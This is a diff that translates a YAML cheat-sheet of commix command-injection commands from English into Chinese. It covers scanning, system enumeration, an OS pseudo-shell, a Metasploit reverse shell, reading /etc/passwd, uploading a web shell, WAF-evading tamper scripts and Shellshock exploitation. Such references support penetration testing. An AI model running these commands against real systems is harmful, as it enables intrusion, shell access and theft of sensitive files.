@@ -4,116 +4,90 @@ tags: [web, security, pentest, exploitation, vulnerability-scanner, command-inje
 actions:
 # === TARGETING & BASIC SCANNING ===
 
- - title: commix - basic GET request scan
+ - title: commix - 基本 GET 请求扫描
    desc: |
-     Performs a basic scan on a target URL to identify command injection vulnerabilities in GET parameters.
-     The tool will automatically test all available parameters unless specified otherwise.
-     This is the most common starting point for assessing simple web forms or API endpoints.
-     It uses multiple injection techniques including results-based and blind injections.
+     对目标 URL 执行基本扫描，以识别 GET 参数中的命令注入漏洞。
+     除非另行指定，工具会自动测试所有可用参数，并使用基于结果的注入和盲注等多种技术。
    command: "commix --url {{url}}"
 
- - title: commix - scan with POST data
+ - title: commix - 使用 POST 数据进行扫描
    desc: |
-     Tests for command injection within the body of a POST request.
-     You should provide the data string exactly as it is sent by the browser.
-     Using the 'INJECT_HERE' string helps the tool identify the specific parameter you want to test.
-     This is ideal for testing login forms, search bars, or any data-submission interface.
+     测试 POST 请求正文中的命令注入。
+     应按浏览器实际发送的格式提供数据字符串，并使用 INJECT_HERE 字符串标记要测试的具体参数。
    command: "commix --url {{url}} --data='{{parameter}}=INJECT_HERE'"
 
- - title: commix - scan using raw request file
+ - title: commix - 使用原始请求文件扫描
    desc: |
-     Loads the entire HTTP request from a text file, which is usually exported from a proxy like Burp Suite.
-     This method is highly recommended for complex requests involving specific headers, cookies, and formatting.
-     It ensures that the environment during testing matches the real-world request exactly.
-     Use this when you need to maintain a complex session or stateful interaction.
+     从文本文件加载完整的 HTTP 请求，该文件通常从 Burp Suite 等代理导出。
+     对于包含特定请求头、Cookie 和格式的复杂请求，强烈推荐使用此方法。
    command: "commix -r {{request_file|request.txt}}"
 
 # === REQUEST CUSTOMIZATION ===
 
- - title: commix - scan with cookies and headers
+ - title: commix - 携带 Cookie 和请求头扫描
    desc: |
-     Enables testing on pages that require authentication or specific session cookies.
-     You can also provide custom HTTP headers like 'X-Forwarded-For' to test for injection in logging or headers.
-     This is essential for bypassing authentication walls and testing the internal logic of a web application.
-     Make sure the session is active, as expired cookies will lead to inaccurate results.
+     支持对需要认证或特定会话 Cookie 的页面进行测试。
+     也可提供自定义 HTTP 请求头（如 X-Forwarded-For）来测试日志或请求头中的注入。
    command: "commix --url {{url}} --cookie='{{cookie|PHPSESSID=12345}}' --header='{{header|X-Forwarded-For: 127.0.0.1}}'"
 
- - title: commix - scan through a proxy
+ - title: commix - 通过代理扫描
    desc: |
-     Routes all Commix traffic through a specified proxy server, such as Burp Suite or Tor.
-     This is useful for debugging the tool's payloads or for anonymizing the source of the scan.
-     The format should follow protocol://address:port (e.g., http://127.0.0.1:8080).
-     Using the --tor flag is a shortcut for routing through the local Tor service.
+     将所有 Commix 流量经由指定代理服务器（如 Burp Suite 或 Tor）转发。
+     格式应为 protocol://address:port（如 http://127.0.0.1:8080），使用 --tor 标志可快捷走本地 Tor 服务。
    command: "commix --url {{url}} --proxy={{proxy|http://127.0.0.1:8080}}"
 
 # === ENUMERATION ===
 
- - title: commix - system information enumeration
+ - title: commix - 系统信息枚举
    desc: |
-     Attempts to gather detailed information about the underlying operating system once an injection point is found.
-     It retrieves data such as the current user, hostname, kernel version, and architecture.
-     This command is useful for post-exploitation planning and understanding the environment's constraints.
-     Note that results depend on the privileges of the user running the web service.
+     在找到注入点后，尝试收集底层操作系统的详细信息。
+     可获取当前用户、主机名、内核版本和架构等信息，用于后续利用规划。
    command: "commix --url {{url}} --sys-info"
 
- - title: commix - check for root/admin privileges
+ - title: commix - 检查 root/管理员权限
    desc: |
-     Checks if the current user on the target system has administrative or root-level privileges.
-     This is a critical step in a penetration test to determine the potential impact of the vulnerability.
-     High privileges allow for deeper system access, such as reading password files or installing backdoors.
-     It uses logic tailored for both Linux (is-root) and Windows (is-admin) systems.
+     检查目标系统上的当前用户是否具有管理员或 root 级权限。
+     这是渗透测试中确定漏洞潜在影响的关键步骤，逻辑针对 Linux（is-root）和 Windows（is-admin）分别适配。
    command: "commix --url {{url}} --is-root"
 
 # === EXPLOITATION & SHELLS ===
 
- - title: commix - drop into pseudo-shell
+ - title: commix - 进入伪 Shell
    desc: |
-     Provides an interactive command-line interface on the target system after a successful injection.
-     This pseudo-shell allows you to execute OS commands as if you had direct terminal access.
-     It is not a full TTY shell, but it simulates the experience by wrapping injections into a prompt.
-     Use this for manual exploration and local enumeration of the target server.
+     注入成功后，在目标系统上提供交互式命令行接口。
+     该伪 Shell 虽非完整 TTY，但可将注入包装为提示符，模拟终端体验。
    command: "commix --url {{url}} --os-shell"
 
- - title: commix - reverse shell via Metasploit
+ - title: commix - 通过 Metasploit 建立反向 Shell
    desc: |
-     Automates the creation and execution of a reverse shell payload using the Metasploit Framework.
-     You must have Metasploit installed on your local machine for this feature to work properly.
-     It will attempt to bypass various restrictions to establish a stable connection back to your listener.
-     This is often the preferred method for transitioning from command injection to full system control.
+     使用 Metasploit Framework 自动创建并执行反向 Shell 载荷。
+     本机需安装 Metasploit，工具会尝试绕过各种限制以建立回到监听端的稳定连接。
    command: "commix --url {{url}} --reverse-tcp"
 
 # === FILE OPERATIONS ===
 
- - title: commix - read remote file
+ - title: commix - 读取远程文件
    desc: |
-     Attempts to read the contents of a specific file from the target's filesystem using the injection vulnerability.
-     This is highly effective for stealing configuration files, source code, or sensitive system data like /etc/passwd.
-     You must provide the absolute path to the file you wish to retrieve.
-     The success of this action depends on the file permissions of the web server user.
+     利用注入漏洞尝试读取目标文件系统中特定文件的内容。
+     对窃取配置文件、源码或 /etc/passwd 等敏感数据非常有效，需提供文件的绝对路径。
    command: "commix --url {{url}} --file-read={{remote_file|/etc/passwd}}"
 
- - title: commix - upload local file to host
+ - title: commix - 上传本地文件到主机
    desc: |
-     Uploads a file from your local machine to a specific directory on the target server.
-     You must specify both the local source path and the remote destination path.
-     This can be used to upload web shells, scripts, or other post-exploitation tools.
-     Ensure that the destination directory is writable by the web server user.
+     将本地文件上传到目标服务器的指定目录。
+     需同时指定本地源路径和远程目标路径，可用于上传 Web Shell、脚本等后渗透工具。
    command: "commix --url {{url}} --file-upload={{local_file}} --file-dest={{remote_path|/tmp/shell.php}}"
 
 # === ADVANCED DETECTION & EVASION ===
 
- - title: commix - advanced detection level and tampering
+ - title: commix - 高级检测级别与混淆
    desc: |
-     Increases the depth of testing by setting a higher level (up to 3) for more exhaustive injection attempts.
-     It also applies tamper scripts to modify the payloads, which helps in bypassing WAF or IPS filters.
-     Level 3 includes more time-consuming and invasive checks that might find hidden vulnerabilities.
-     Use this when basic scans fail but you strongly suspect a vulnerability exists.
+     通过设置更高级别（最高 3）进行更详尽的注入尝试，并应用混淆脚本修改载荷以绕过 WAF 或 IPS 过滤。
+     级别 3 包含更耗时且更具侵入性的检查，可发现隐藏漏洞。
    command: "commix --url {{url}} --level=3 --tamper={{tamper_script|base64encode}}"
 
- - title: commix - exploit Shellshock
+ - title: commix - 利用 Shellshock
    desc: |
-     Specifically targets the Shellshock (CVE-2014-6271) vulnerability in web applications.
-     This module focuses on injecting payloads through HTTP headers that are often processed by vulnerable Bash versions.
-     It is particularly effective against older CGI-based web servers and legacy systems.
-     Shellshock allows for immediate and often high-privileged command execution.
+     专门针对 Web 应用中的 Shellshock（CVE-2014-6271）漏洞。
+     该模块通过 HTTP 请求头注入载荷，对运行易受攻击 Bash 版本的旧版 CGI Web 服务器尤为有效。
    command: "commix --url {{url}} --shellshock"
